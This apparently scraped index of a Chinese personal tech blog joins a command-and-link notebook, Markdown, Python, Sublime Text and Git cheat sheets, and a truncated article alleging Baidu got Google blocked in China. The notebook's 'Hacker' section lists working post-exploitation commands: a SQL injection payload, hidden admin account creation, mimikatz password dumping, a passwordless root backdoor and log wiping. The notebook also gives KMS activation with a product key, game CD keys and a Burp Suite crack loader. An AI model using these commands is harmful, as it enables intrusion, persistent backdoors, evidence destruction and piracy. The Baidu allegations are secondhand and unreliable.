(unix2dos.exe -q \u0026#34;%G\u0026#34;) FOR /L %G IN (1,1,5) DO (type nul \u0026gt; %G.txt) http://www.efgh.com/software/unix2dos.htm https://waterlan.home.xs4all.nl/dos2unix.html 代码格式化 FOR /R \u0026#34;D:\\Download\\code\u0026#34; %%i IN (*) DO (uncrustify.exe -c 123.cfg --no-backup \u0026#34;%%i\u0026#34;) http://astyle.sourceforge.net/ https://github.com/uncrustify/uncrustify http://ww4.sinaimg.cn/large/a15b4afegy1fkfjyuhmvlj203k03kaor 修改环境变量 set echo %PATH% 临时生效： set PATH=%PATH%;D:\\Download\\123 永久生效： setx PATH \u0026#34;%PATH%;D:\\Download\\123\u0026#34; /m ---- cls pause start. calc SnippingTool ping z.cn doskey /history date /t \u0026amp;\u0026amp; time /t fc /n /w /a 1.txt 2.txt mstsc /admin certutil -urlcache certutil -hashfile 1.txt SHA1 busybox realpath 123.txt WebX https://storage.googleapis.com/downloads.webmproject.org/releases/webm/index.html https://storage.googleapis.com/downloads.webmproject.org/releases/webp/index.html Translation https://cn.bing.com/translator https://www.deepl.com/translator https://translate.google.cn/m/translate https://m.dict.cn/ https://dict.eudic.net/ https://dict.youdao.com/m https://www.collinsdictionary.com/zh/ 简繁转换：https://github.com/BYVoid/OpenCC Bilibili 专栏取消复制限制 $(\u0026#34;.article-holder\u0026#34;).removeClass(\u0026#34;unable-reprint\u0026#34;); $(\u0026#34;.article-holder\u0026#34;).off(\u0026#34;copy\u0026#34;); SumatraPDF TextColor = #a9b7c6 BackgroundColor = #2b2b2b SelectionColor = #b3d4fc https://www.sumatrapdfreader.org/settings.html https://www.sumatrapdfreader.org/prerelease.html C C： https://zh.m.wikipedia.org/zh-cn/C语言 https://en.wikibooks.org/wiki/C_Programming https://code.google.com/archive/p/msys-cn/ https://zh.cppreference.com/w/c http://www.cplusplus.com/reference/clibrary/ https://pubs.opengroup.org/onlinepubs/9699919799/idx/index.html http://docwiki.embarcadero.com/RADStudio/Rio/en/C_Run-Time_Library_Reference https://docs.microsoft.com/zh-cn/cpp/c-runtime-library/run-time-routines-by-category https://docs.microsoft.com/zh-cn/cpp/c-language/organization-of-the-c-language-reference CMake： https://cmake.org/cmake/help/latest/ MFC： https://docs.microsoft.com/zh-cn/cpp/mfc/mfc-desktop-applications GCC： https://gcc.gnu.org/onlinedocs/gcc/Option-Index.html IDE： https://www1.qt.io/offline-installers/#section-11 https://www.jetbrains.com/clion/download/ https://sourceforge.net/projects/orwelldevcpp/ Templates： https://svn.code.sf.net/p/codeblocks/code/trunk/src/templates/ https://sourceforge.net/p/orwelldevcpp/code/ci/master/tree/Templates/ Linux Code: https://elixir.bootlin.com/ C#（.NET Core） dotnet new console -n hello \u0026amp;\u0026amp; cd hello ----- dotnet publish -c abc dotnet hello.dll ----- dotnet publish -c abc -r win-x64 hello.exe Core： https://www.microsoft.com/net/download/windows Framework： C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe API： https://docs.microsoft.com/zh-cn/dotnet/api/index?view=netframework-4.7 https://docs.microsoft.com/zh-cn/dotnet/api/system.math.sqrt?view=netframework-4.7 class Hello { public static void Main(string[] args) { System.Console.WriteLine(\u0026#34;Hello World!\u0026#34;); System.Console.ReadLine(); } } Office 多窗口切换：视图 -\u0026gt; 切换窗口 快捷键设置：选项 -\u0026gt; 自定义功能区 -\u0026gt; 键盘快捷方式 -\u0026gt; 视图选项卡 -\u0026gt; WindowList -\u0026gt; Alt+Shift+Q Excel https://support.office.com/zh-cn/article/Excel-函数（按字母顺序）-b3944572-255d-4efb-bb96-c6d90033e188 https://support.office.com/zh-cn/article/面向-Windows-的-Excel-键盘快捷方式和功能键-1798d9d5-842a-42b8-9c99-9b7213f0040f https://support.office.com/zh-cn/article/在相对引用、绝对引用和混合引用间切换-dfec08cd-ae65-4f56-839e-5f0d8d0baca9 F2 编辑 F4 切换引用类型 Ctrl+D 向下填充 拼接字符串： =\u0026#34;String\u0026#34;\u0026amp;A1\u0026amp;\u0026#34;String\u0026#34; 判断奇偶数： =IF(MOD(A1,2),\u0026#34;奇数\u0026#34;,\u0026#34;偶数\u0026#34;) Install C2R（零售版） setup.exe /download 123.xml setup.exe /configure 123.xml https://config.office.com/ https://www.microsoft.com/en-us/download/confirmation.aspx?id=49117 https://support.office.com/zh-cn/article/d3879f0d-766c-469c-9440-0a9a2a905ca8 https://support.microsoft.com/zh-cn/help/257757 ----- PS：4 天死磕的教训，软件编程方面少跟 **微软的系统组件** 打交道，特别是关于注册表、DCOM、Office 之类的。 123.xml ⇳ \u0026lt;Configuration\u0026gt; \u0026lt;Add SourcePath=\u0026#34;D:\\Download\\Office\\\u0026#34; OfficeClientEdition=\u0026#34;64\u0026#34; Channel=\u0026#34;PerpetualVL2019\u0026#34;\u0026gt; \u0026lt;Product ID=\u0026#34;Word2019Volume\u0026#34;\u0026gt; \u0026lt;Language ID=\u0026#34;zh-cn\u0026#34;/\u0026gt; \u0026lt;/Product\u0026gt; \u0026lt;Product ID=\u0026#34;Excel2019Volume\u0026#34;\u0026gt; \u0026lt;Language ID=\u0026#34;zh-cn\u0026#34;/\u0026gt; \u0026lt;/Product\u0026gt; \u0026lt;Product ID=\u0026#34;PowerPoint2019Volume\u0026#34;\u0026gt; \u0026lt;Language ID=\u0026#34;zh-cn\u0026#34;/\u0026gt; \u0026lt;/Product\u0026gt; \u0026lt;/Add\u0026gt; \u0026lt;Updates Enabled=\u0026#34;FALSE\u0026#34;/\u0026gt; \u0026lt;Display Level=\u0026#34;Full\u0026#34; AcceptEULA=\u0026#34;TRUE\u0026#34;/\u0026gt; \u0026lt;Logging Level=\u0026#34;Standard\u0026#34; Path=\u0026#34;D:\\Download\\Office\\\u0026#34;/\u0026gt; \u0026lt;Property Name=\u0026#34;AUTOACTIVATE\u0026#34; Value=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;/Configuration\u0026gt; MSI（批量授权版） http://blog.sina.com.cn/s/blog_17b2ea0820102x7ds.html FOR /R \u0026#34;%CD%\\key\u0026#34; %%i IN (*.xrm-ms) DO (cscript.exe //Nologo \u0026#34;%Windir%\\System32\\slmgr.vbs\u0026#34; /ilc \u0026#34;%%i\u0026#34;) cscript.exe //Nologo \u0026#34;%CD%\\Office16\\OSPP.vbs\u0026#34; /inpkey:XQNVK-8JYDB-WJ9W3-YJ8YR-WFG99 cscript.exe //Nologo \u0026#34;%CD%\\Office16\\OSPP.vbs\u0026#34; /sethst:kms.shuax.com cscript.exe //Nologo \u0026#34;%CD%\\Office16\\OSPP.vbs\u0026#34; /act cscript.exe //Nologo \u0026#34;%CD%\\Office16\\OSPP.vbs\u0026#34; /dstatus Replace Notepad Install: reg add \u0026#34;HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\u0026#34; /v \u0026#34;Debugger\u0026#34; /t REG_SZ /d \u0026#34;\\\u0026#34;%~dp0Notepad2.exe\\\u0026#34; /z\u0026#34; /f Uninstall: reg delete \u0026#34;HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\u0026#34; /f Photoshop 1. 仿制图章 2. 栅格化文字 3. 滤镜 -\u0026gt; 杂色 -\u0026gt; 添加杂色 -\u0026gt; 单色 30% 4. 滤镜 -\u0026gt; 模糊 -\u0026gt; 高斯模糊 -\u0026gt; 0.4 Warcraft III CD-Key Reign of Chaos: K30EKC-XZ85-6FHWP5-QNY3-314OF6 The Frozen Throne: WGZPYW-V6CY-7P7JTR-YH4F-8ZH9PC Hacker 漏洞： https://drops.tuisec.win/ https://paper.tuisec.win/ 漏洞利用：Metasploit https://rpm.metasploit.com/ https://windows.metasploit.com/ 漏洞扫描：Nessus https://www.tenable.com/products/nessus/select-your-operating-system 漏洞渗透：Burp Suite、Zed Attack Proxy https://portswigger.net/bappstore https://portswigger.net/burp/releases https://portswigger.net/burp/releases/download?product=pro https://github.com/zaproxy/zaproxy 网络扫描：Nmap https://nmap.org/download.html https://github.com/nmap/nmap/tree/master/ncat SQL 注入：sqlmap https://github.com/sqlmapproject/sqlmap/archive/master.zip ----- python sqlmap.py -r 123.log -p id -v 3 --dbms=oracle --risk=3 --level=5 --tamper=space2comment --timeout=10 --code=200 --string=\u0026#34;200 OK\u0026#34; ----- \u0026#39;or \u0026#39;1\u0026#39;=\u0026#39;1 API 测试：Postman https://www.getpostman.com/downloads/ Windows 用户提权： CMD /C NET USER admin 123456 /ADD CMD /C NET LOCALGROUP Administrators admin /ADD CMD /C NET USER admin /ACTIVE:YES Windows 远程复制： NET USE X: \\\\218.221.10.56\\D$ /USER:admin 123456 COPY X:\\doc\\123.txt . /Y NET USE X: /DELETE /Y Windows 密码：mimikatz https://github.com/gentilkiwi/mimikatz ----- mimikatz.exe \u0026#34;log 123.log\u0026#34; version hostname privilege::debug sekurlsa::logonpasswords exit Linux： 1. 上传公钥 ssh-copy-id root@218.221.10.50 ssh root@218.221.10.50 2. 添加账号 echo \u0026#34;sqnuid:x:0:0::/:/bin/bash\u0026#34; \u0026gt;\u0026gt; /etc/passwd echo \u0026#34;sqnuid::::::::\u0026#34; \u0026gt;\u0026gt; /etc/shadow Linux 清空痕迹： cat /root/.bash_history who unset HISTFILE echo \u0026gt; /var/run/utmp echo \u0026gt; /var/log/wtmp echo \u0026gt; /var/log/btmp echo \u0026gt; /var/log/secure echo \u0026gt; /var/log/lastlog 无线网卡： https://wikidevi.wi-cat.ru/Wireless_adapters/Chipset_table 无线路由器： https://openwrt.org/toh/start BurpLoader java \\ --add-opens=java.desktop/javax.swing=ALL-UNNAMED \\ --add-opens=java.base/java.lang=ALL-UNNAMED \\ --add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED \\ --add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED \\ --add-opens=java.base/jdk.internal.org.objectweb.asm.Opcodes=ALL-UNNAMED \\ -javaagent:burploader.jar -noverify -jar \\ burpsuite_pro_v2024.7.6.jar https://github.com/h3110w0r1d-y/BurpLoaderKeygen https://t.me/BurpLoaderKeygen Android USB 代理网络 adb reverse tcp:9527 tcp:8080 adb reverse --list adb reverse --remove-all --- adb shell settings put global http_proxy 127.0.0.1:9527 adb shell settings delete global http_proxy ","permalink":"https://xhstormr.github.io/blog/posts/note/","summary":"","title":"Note"},{"content":" http://commonmark.org/\nMarkdown 是一种轻量级标记语言，创始人为约翰·格鲁伯（John Gruber）。它允许人们“使用易读易写的纯文本格式编写文档，然后转换成有效的XHTML(或者HTML)文档”。这种语言吸收了很多在电子邮件中已有的纯文本标记的特性。——维基百科\n我把与Markdown相关的基本语法按其类型整理在这里，以便查阅。\n1. 标题 # 一级标题 ## 二级标题 ### 三级标题 #### 四级标题 ##### 五级标题 ###### 六级标题 2. 列表 - 无序列表1 - 无序列表2 - 无序列表3 1. 有序列表1 2. 有序列表2 3. 有序列表3 3. 引用 \u0026gt; 这个是引用 \u0026gt; 是不是和电子邮件中的 \u0026gt; 引用格式很像 4. 粗体与斜体 **这个是粗体** *这个是斜体* 5. 链接与图片 自动链接\n\u0026lt;http://xhstormr.github.io/\u0026gt; \u0026lt;XhstormR@foxmail.com\u0026gt; 插入链接\n[link text](http://example.com/ \u0026quot;optional title\u0026quot;) [link text][id] [id]: http://example.com/ \u0026quot;optional title here\u0026quot; 插入图片\n![](/path/to/img.jpg \u0026quot;optional title\u0026quot;){ImgCap}alt text{/ImgCap} 图片链接\n[![][jane-eyre-pic]][jane-eyre-douban] [jane-eyre-pic]: http://img3.douban.com/mpic/s1108264.jpg [jane-eyre-douban]: http://book.douban.com/subject/1141406/ 6. 代码 用TAB键起始的段落，会被认为是代码块\n\u0026lt;php\u0026gt; echo “hello world\u0026quot;; \u0026lt;/php\u0026gt; 如果在一个行内需要引用代码，只要用反引号`引起来就好\nUse the `printf()` function. 7. 分割线、删除线 可以在一行中用三个以上的星号、减号、底线来建立一个分隔线,用~可建立删除线。\n--- ~~Mistaken text.~~ 8. 代码块与语法高亮 ```ruby require 'redcarpet' markdown = Redcarpet.new(\u0026quot;Hello World!\u0026quot;) puts markdown.to_html ``` 段落、标题、区块代码 区块引用则使用 email 形式的 \u0026lsquo;\u0026gt;\u0026rsquo; 角括号。\nMarkdown 语法:\nA First Level Header ==================== A Second Level Header --------------------- Now is the time for all good men to come to the aid of their country. This is just a regular paragraph. The quick brown fox jumped over the lazy dog's back. ### Header 3 \u0026gt; This is a blockquote. \u0026gt; \u0026gt; This is the second paragraph in the blockquote. \u0026gt; \u0026gt; ## This is an H2 in a blockquote 修辞和强调 Markdown 使用星号和底线来标记需要强调的区段。\nMarkdown 语法:\nSome of these words *are emphasized*. Some of these words _are emphasized also_. Use two asterisks for **strong emphasis**. Or, if you prefer, __use two underscores instead__. 列表 无序列表使用星号、加号和减号来做为列表的项目标记，这些符号是都可以使用的，使用星号：\n* Candy. * Gum. * Booze. 加号：\n+ Candy. + Gum. + Booze. 和减号\n- Candy. - Gum. - Booze. 有序的列表则是使用一般的数字接着一个英文句点作为项目标记：\n1. Red 2. Green 3. Blue 如果你在项目之间插入空行，那项目的内容会用 \u0026lt;p\u0026gt; 包起来，你也可以在一个项目内放上多个段落，只要在它前面缩排 4 个空白或 1 个 tab 。\n* A list item. With multiple paragraphs. * Another item in the list. 链接 Markdown 支援两种形式的链接语法： 行内 和 参考 两种形式，两种都是使用角括号来把文字转成连结。\n行内形式是直接在后面用括号直接接上链接：\nThis is an [example link](http://example.com/). 你也可以选择性的加上 title 属性：\nThis is an [example link](http://example.com/ \u0026quot;With a Title\u0026quot;). 参考形式的链接让你可以为链接定一个名称，之后你可以在文件的其他地方定义该链接的内容：\nI get 10 times more traffic from [Google][1] than from [Yahoo][2] or [MSN][3]. [1]: http://google.com/ \u0026quot;Google\u0026quot; [2]: http://search.yahoo.com/ \u0026quot;Yahoo Search\u0026quot; [3]: http://search.msn.com/ \u0026quot;MSN Search\u0026quot; title 属性是选择性的，链接名称可以用字母、数字和空格，但是不分大小写：\nI start my morning with a cup of coffee and [The New York Times][NY Times]. [ny times]: http://www.nytimes.com/ 图片 图片的语法和链接很像。\n行内形式（title 是选择性的）：\n![alt text](/path/to/img.jpg \u0026quot;Title\u0026quot;) 参考形式：\n![alt text][id] [id]: /path/to/img.jpg \u0026quot;Title\u0026quot; 上面两种方法都会输出 HTML 为：\n\u0026lt;img src=\u0026quot;/path/to/img.jpg\u0026quot; alt=\u0026quot;alt text\u0026quot; title=\u0026quot;Title\u0026quot; /\u0026gt; 代码 在一般的段落文字中，你可以使用反引号 ` 来标记代码区段，区段内的 \u0026amp;、\u0026lt; 和 \u0026gt; 都会被自动的转换成 HTML 实体，这项特性让你可以很容易的在代码区段内插入 HTML 码：\nI strongly recommend against using any `\u0026lt;blink\u0026gt;` tags. I wish SmartyPants used named entities like `\u0026amp;mdash;` instead of decimal-encoded entites like `\u0026amp;#8212;`. 如果要建立一个已经格式化好的代码区块，只要每行都缩进 4 个空格或是一个 tab 就可以了，而 \u0026amp;、\u0026lt; 和 \u0026gt; 也一样会自动转成 HTML 实体。\nMarkdown 语法:\nIf you want your page to validate under XHTML 1.0 Strict, you've got to put paragraph tags in your blockquotes: \u0026lt;blockquote\u0026gt; \u0026lt;p\u0026gt;For example.\u0026lt;/p\u0026gt; \u0026lt;/blockquote\u0026gt; ","permalink":"https://xhstormr.github.io/blog/posts/cheatsheet-markdown/","summary":"","title":"Markdown 简明语法手册"},{"content":"解释器 官方版本的解释器：CPython,但下载的是MSI文件,本人比较洁癖,想用绿色版,绿化方法如下 :\n打开CMD，输入\nmsiexec /a \u0026#34;F:\\test.msi\u0026#34; /qb TARGETDIR=\u0026#34;F:\\dir\u0026#34; 其中F:\\test.msi是msi文件的路径，F:\\dir是解压路径。\nPython版本 我用的是最新版Python_3.4.2,但是选择最新的.不代表是最好的选择。网上的教程大多是2.0版本的,语法跟3.0版本略不同,所以只能跟官网对比着语法学习。\n语法 print(123),输出123\n对于英文print(abc)不行,print('abc')就可以,加了''便会视为字符串,输出abc\n没加的话,就会视为变量,如果之前没用到abc=input()为变量赋值的话,便会报错.\nname=input(mike),为name赋值为mike\n跟语法1相结合我们可以先用name=input()赋值为mike,再输入print('hello',name),便会得到hello,mike\n另外我们可以这样输入name=input('please enter your name:')便会有提示信息please enter your name:显示.\n","permalink":"https://xhstormr.github.io/blog/posts/python1/","summary":"","title":"Python(一)"},{"content":" 我把Sublime Text 快捷键按其类型整理在这里，以便查阅。\n通用（General） ↑↓←→：上下左右移动光标，注意不是不是KJHL！ Alt：调出菜单 Ctrl + Shift + P：调出命令板（Command Palette） Ctrl + ` ：调出控制台 编辑（Editing） Ctrl + Enter：在当前行下面新增一行然后跳至该行 Ctrl + Shift + Enter：在当前行上面增加一行并跳至该行 Ctrl + ←/→：进行逐词移动 Ctrl + Shift + ←/→进行逐词选择 Ctrl + ↑/↓移动当前显示区域 Ctrl + Shift + ↑/↓移动当前行 选择（Selecting） Ctrl + D：选择当前光标所在的词并高亮该词所有出现的位置，再次Ctrl + D选择该词出现的下一个位置，在多重选词的过程中，使用Ctrl + K进行跳过，使用Ctrl + U进行回退，使用Esc退出多重编辑 Ctrl + Shift + L：将当前选中区域打散 Ctrl + J：把当前选中区域合并为一行 Ctrl + M：在起始括号和结尾括号间切换 Ctrl + Shift + M：快速选择括号间的内容 Ctrl + Shift + J：快速选择同缩进的内容 Ctrl + Shift + Space：快速选择当前作用域（Scope）的内容 查找\u0026amp;替换（Finding\u0026amp;Replacing） F3：跳至当前关键字下一个位置 Shift + F3：跳到当前关键字上一个位置 Alt + F3：选中当前关键字出现的所有位置 Ctrl + F/H：进行标准查找/替换，之后： Alt + C：切换大小写敏感（Case-sensitive）模式 Alt + W：切换整字匹配（Whole matching）模式 Alt + R：切换正则匹配（Regex matching）模式 Ctrl + Shift + H：替换当前关键字 Ctrl + Alt + Enter：替换所有关键字匹配 Ctrl + Shift + F：多文件搜索\u0026amp;替换 跳转（Jumping） Ctrl + P：跳转到指定文件，输入文件名后可以： @ 符号跳转：输入@symbol跳转到symbol符号所在的位置 # 关键字跳转：输入#keyword跳转到keyword所在的位置 : 行号跳转：输入:12跳转到文件的第12行。 Ctrl + R：跳转到指定符号 Ctrl + G：跳转到指定行号 窗口（Window） Ctrl + Shift + N：创建一个新窗口 Ctrl + N：在当前窗口创建一个新标签 Ctrl + W：关闭当前标签，当窗口内没有标签时会关闭该窗口 Ctrl + Shift + T：恢复刚刚关闭的标签 屏幕（Screen） F11：切换普通全屏 Shift + F11：切换无干扰全屏 Alt + Shift + 2：进行左右分屏 Alt + Shift + 8：进行上下分屏 Alt + Shift + 5：进行上下左右分屏 分屏之后，使用Ctrl + 数字键跳转到指定屏，使用Ctrl + Shift + 数字键将当前屏移动到指定屏 ","permalink":"https://xhstormr.github.io/blog/posts/cheatsheet-sublime-text/","summary":"","title":"Sublime Text 快捷键列表"},{"content":"Updated on 2016-11-07\nhttps://git-scm.com/book/zh\nhttps://ndpsoftware.com/git-cheatsheet.html\nhttps://backlog.com/git-tutorial/cn/contents/\nhttps://rogerdudler.github.io/git-guide/index.zh.html\nhttps://marklodato.github.io/visual-git-guide/index-zh-cn.html\nhttps://www.sourcetreeapp.com/\nhttps://npm.taobao.org/mirrors/git-for-windows/\nhttps://github.com/git-for-windows/git/releases/latest\n我把常用的 Git 命令按其类型整理在这里，以便查阅。\n一般来说，日常使用只要记住下图6个命令，就可以了。但是熟练使用，恐怕要记住60～100个命令。\n几个专用名词的译名如下:\nWorkspace：工作区 Index / Stage：暂存区 Repository：仓库区 / 本地仓库 Remote：远程仓库 1. 新建代码库 # 在当前目录新建一个Git代码库 $ git init # 新建一个目录，将其初始化为Git代码库 $ git init [project-name] # 下载一个项目和它的整个代码历史 $ git clone [url] 2. 配置 Git的设置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。\n# 显示当前的Git配置 $ git config --list # 编辑Git配置文件 $ git config -e [--global] # 设置提交代码时的用户信息 $ git config [--global] user.name \u0026#34;[name]\u0026#34; $ git config [--global] user.email \u0026#34;[email address]\u0026#34; 3. 增加/删除文件 # 添加指定文件到暂存区 $ git add [file1] [file2] ... # 添加指定目录到暂存区，包括子目录 $ git add [dir] # 添加当前目录的所有文件到暂存区 $ git add . # 删除工作区文件，并且将这次删除放入暂存区 $ git rm [file1] [file2] ... # 停止追踪指定文件，但该文件会保留在工作区 $ git rm --cached [file] # 改名文件，并且将这个改名放入暂存区 $ git mv [file-original] [file-renamed] 4. 代码提交 # 提交暂存区到仓库区 $ git commit -m [message] # 提交暂存区的指定文件到仓库区 $ git commit [file1] [file2] ... -m [message] # 提交工作区自上次commit之后的变化，直接到仓库区 $ git commit -a # 提交时显示所有diff信息 $ git commit -v # 使用一次新的commit，替代上一次提交 # 如果代码没有任何新变化，则用来改写上一次commit的提交信息 $ git commit --amend -m [message] # 重做上一次commit，并包括指定文件的新变化 $ git commit --amend [file1] [file2] ... 5. 分支 # 列出所有本地分支 $ git branch # 列出所有远程分支 $ git branch -r # 列出所有本地分支和远程分支 $ git branch -a # 新建一个分支，但依然停留在当前分支 $ git branch [branch-name] # 新建一个分支，并切换到该分支 $ git checkout -b [branch] # 新建一个分支，指向指定commit $ git branch [branch] [commit] # 新建一个分支，与指定的远程分支建立追踪关系 $ git branch --track [branch] [remote-branch] # 切换到指定分支，并更新工作区 $ git checkout [branch-name] # 建立追踪关系，在现有分支与指定的远程分支之间 $ git branch --set-upstream [branch] [remote-branch] # 合并指定分支到当前分支 $ git merge [branch] # 选择一个commit，合并进当前分支 $ git cherry-pick [commit] # 删除分支 $ git branch -d [branch-name] # 删除远程分支 $ git push origin --delete [branch-name] $ git branch -dr [remote/branch] 6. 标签 # 列出所有tag $ git tag # 新建一个tag在当前commit $ git tag [tag] # 新建一个tag在指定commit $ git tag [tag] [commit] # 删除本地tag $ git tag -d [tag] # 删除远程tag $ git push origin :refs/tags/[tagName] # 查看tag信息 $ git show [tag] # 提交指定tag $ git push [remote] [tag] # 提交所有tag $ git push [remote] --tags # 新建一个分支，指向某个tag $ git checkout -b [branch] [tag] 7. 查看信息 # 显示有变更的文件 $ git status # 显示当前分支的版本历史 $ git log # 显示commit历史，以及每次commit发生变更的文件 $ git log --stat # 显示某个commit之后的所有变动，每个commit占据一行 $ git log [tag] HEAD --pretty=format:%s # 显示某个commit之后的所有变动，其\u0026#34;提交说明\u0026#34;必须符合搜索条件 $ git log [tag] HEAD --grep feature # 显示某个文件的版本历史，包括文件改名 $ git log --follow [file] $ git whatchanged [file] # 显示指定文件相关的每一次diff $ git log -p [file] # 显示指定文件是什么人在什么时间修改过 $ git blame [file] # 显示暂存区和工作区的差异 $ git diff # 显示暂存区和上一个commit的差异 $ git diff --cached [file] # 显示工作区与当前分支最新commit之间的差异 $ git diff HEAD # 显示两次提交之间的差异 $ git diff [first-branch]...[second-branch] # 显示某次提交的元数据和内容变化 $ git show [commit] # 显示某次提交发生变化的文件 $ git show --name-only [commit] # 显示某次提交时，某个文件的内容 $ git show [commit]:[filename] # 显示当前分支的最近几次提交 $ git reflog 8. 远程同步 # 下载远程仓库的所有变动 $ git fetch [remote] # 显示所有远程仓库 $ git remote -v # 显示某个远程仓库的信息 $ git remote show [remote] # 增加一个新的远程仓库，并命名 $ git remote add [shortname] [url] # 取回远程仓库的变化，并与本地分支合并（pull = fetch + merge） $ git pull [remote] [branch] # 上传本地指定分支到远程仓库 $ git push [remote] [branch] # 强行推送当前分支到远程仓库，即使有冲突 $ git push [remote] --force # 推送所有分支到远程仓库 $ git push [remote] --all 9. 撤销 # 恢复暂存区的指定文件到工作区 $ git checkout [file] # 恢复某个commit的指定文件到暂存区和工作区 $ git checkout [commit] [file] # 恢复暂存区的所有文件到工作区 $ git checkout . # 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变 $ git reset [file] # 重置暂存区与工作区，与上一次commit保持一致 $ git reset --hard # 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变 $ git reset [commit] # 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致 $ git reset --hard [commit] # 重置当前HEAD为指定commit，但保持暂存区和工作区不变 $ git reset --keep [commit] # 新建一个commit，用来撤销指定commit # 后者的所有变化都将被前者抵消，并且应用到当前分支 $ git revert [commit] 10. 其他 # 生成一个可供发布的压缩包 $ git archive git config --global diff.context 0 全局设置 diff 时不显示上下文 ------------------------------------------------------- git diff 工作区与暂存区比较 git diff head 工作区与仓库区比较 git diff --cached 暂存区与仓库区比较 vim ~/.bashrc alias ll=\u0026#39;ls -lhF --color=auto\u0026#39; alias grep=\u0026#39;grep -n --color=auto\u0026#39; source ~/.bashrc ------------------------------------------------------- updatedb --output=\u0026#34;D:\\Download\\GIT\\123.db\u0026#34; --localpaths=\u0026#34;D:\\Download\\GIT\u0026#34; 更新数据库 locate --database=\u0026#34;/d/Download/GIT/123.db\u0026#34; *java*md 查找文件 grep http `locate --database=\u0026#34;/d/Download/GIT/123.db\u0026#34; *java*md` 查找文字 vim ~/.ssh/config ---- ProxyCommand ncat --proxy 127.0.0.1:1080 --proxy-type socks4 %h %p Host github.com Hostname ssh.github.com Port 443 ------------------------------------------------------- git clone git@github.com:XhstormR/Hugo.git HUGO SSH connections over HTTPS git config --global A.B C ------------------------------------------------------- C:\\Users\\XhstormR\\.gitconfig ⇳ [A] B = C git rm -r --cached . git add . git clean -fdxn git gc --prune=all git reset --soft HEAD^ git submodule add -b master https://github.com/openssl/openssl.git git submodule update --remote git archive -o 123.zip HEAD git commit --amend --date=now --no-edit java -jar bfg.jar --no-blob-protection --delete-folders \u0026#34;bin\u0026#34; HUGO cd HUGO git reflog expire --expire=now --all \u0026amp;\u0026amp; git gc --prune=now --aggressive https://rtyley.github.io/bfg-repo-cleaner/ https://maven.aliyun.com/repository/public/com/madgag/bfg/1.13.0/bfg-1.13.0.jar git config --global gui.encoding \u0026#39;utf-8\u0026#39; git config --global core.editor \u0026#39;notepad\u0026#39; git config --global core.autocrlf \u0026#39;true\u0026#39; git config --global core.ignorecase \u0026#39;false\u0026#39; git config --global user.name \u0026#39;XhstormR\u0026#39; git config --global user.email \u0026#39;10527522+XhstormR@users.noreply.github.com\u0026#39; git config --global http.proxy \u0026#39;socks5h://127.0.0.1:1080\u0026#39; git rebase -i 123b394c9c7f45e9d8a04c4b138c805cd7dd7419 -x \u0026#34;git commit --amend --allow-empty --allow-empty-message --author \u0026#39;XhstormR \u0026lt;10527522+XhstormR@users.noreply.github.com\u0026gt;\u0026#39; -CHEAD\u0026#34; ","permalink":"https://xhstormr.github.io/blog/posts/cheatsheet-git/","summary":"","title":"常用 Git 命令清单"},{"content":" 这是一篇2002年的文章，那一年对于搜索引擎界是重要的一年，因为自从那一年后，Google就再也“不好用”了，搜索的时候经常出现“本页无法访问”，然后就会暂时无法连接Google，Google的网页快照功能更被封锁至今仍然无法使用，无奈之中，人们只好选择了和Google“最像”的Baidu搜索引擎，然而，大多数人可能不知道的事实是，国内封杀限制Google其实前后均由搜索引擎公司百度在幕后操作。\n去年底回国了一次，跟几个圈内的朋友聊了聊，其中有百度的员工，虽然所得不多，但初步证实了我由来已久关于Google在国内被封是有公司在背后操作的猜测，非常巧的是新年后在硅谷接待了一位老同学一家，我这位老同学的先生在政府相关部门工作，恰恰了解Google被封这个事，从他那里证实了国内搜索引擎公司百度（baidu.com）前前后后暗中操作Google被封及Google使用功能受限的一些传言。\n我最早怀疑百度的理由非常简单：一是百度公司是Google被封唯一的受益者，Google被封之时，也刚好是国内主要门户更换搜索引擎服务商的时间段，这个事件后，门户网站视Google如洪水猛兽，网易、新浪、雅虎中国、搜狐这样的公司不得不选择了百度的产品，百度从中获利近两百万美元。二是百度作为国内搜索引擎界的知名公司，恐怕没有人比他们更了解Google，对于Google中有些什么有害信息，或者对Google的一些功能进行限制的技术实现手段上，百度是专家。整个Google事件，百度有动机，有条件。\n根据我前后接触四五个与这件事有关的朋友的说法，大概整理出百度操作Google事件的经过：\n2001年中，百度的一个副总即开始与政府有关部门谈Google中“有害信息”的问题，但当时百度接触的人级别比较低，百度的想法也只是想通过政府向使用Google的一些中文网站施加压力，另一方面有关官员也认为Google的服务器在国外，同时在国内影响不大，所以也只是根据百度的举报抽查过用Google服务的网易一两次，并没有什么大的风波。\n2002年的时候百度最为害怕Goolge，因为这时传言Google的Founder将访华，Google也准备在年底正式进入中国市场，同时百度最大的客户新浪、搜狐也正在和Google接触，有在年内与百度的合同结束后换用Google的意向。面对这种情况，有点像是对百度宣判了死刑，所以百度开始变得疯狂，专门制定了一个针对Google的计划。\n根据朋友的说法，从公司层面，百度分三类整理了Google含有所谓政治问题、宗教问题、情色问题的材料，每一类材料多达数百页A4纸，定期向有关部门提交，百度并提供数据证明中国网民经常在查找这些东西。虽然人们在使用Google时，可能不足几万分之一的情况是search这些“不良信息”，但由于百度是国内最大的搜索引擎公司，他们提供的数据却说明中国网民有多达近10个百分点的比例在经常搜索“不良信息”，这样的数据给政府有关部门造成了很大的影响，觉得Google中的“不良信息”对中国网民危害巨大。\n从用户层面，百度也动用了非常多的人力和财力操作这个事，包括组织一些员工和兼职进行信函举报，即以用户身份给有关部门写信投诉Google“危害社会”，“危害中国互联网”，“危害青少年身心健康”，从我在政府部门工作的朋友所称，这一招是非常有效的，对最后有关部门的决策起到了重要作用。\n从高层路线，经过一年的打基础，百度的CEO和VP开始能接触到有一定级别的官员，并适机的传递一些Google中众所周知的特别要害的“有害信息”情况，这也是后来Google被封时民间传言Google所含有特别要害的“有害信息”到达政府一定级别官员的一个重要途径之一。\n2002年9月，中国5600万网民的不幸，历时一年多的阴谋策划后，百度的计划得逞了，有关部门封杀了Google.虽然